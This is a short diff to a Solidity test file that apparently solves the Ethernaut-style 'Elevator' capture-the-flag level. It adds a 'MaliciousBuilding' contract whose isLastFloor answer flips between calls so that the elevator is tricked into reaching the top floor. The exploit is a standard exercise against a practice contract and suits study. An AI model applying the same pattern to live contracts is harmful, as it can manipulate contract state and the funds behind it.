@@ -39,7 +39,30 @@ contract TestElevator is BaseTest {
         vm.startPrank(player, player);
 
         // Solve the Challenge
+        MaliciousBuilding maliciousBuilding = new MaliciousBuilding(level);
+        maliciousBuilding.goTo(1);
 
         vm.stopPrank();
+    }
+}
+
+contract MaliciousBuilding {
+    bool public top;
+    Elevator elevator;
+
+    constructor(Elevator _elevator) public {
+        elevator = _elevator;
+    }
+
+    function isLastFloor(uint256) external returns (bool) {
+        if (!top) {
+            top = true;
+            return false;
+        }
+        return top;
+    }
+
+    function goTo(uint256) external {
+        elevator.goTo(1);
     }
 }
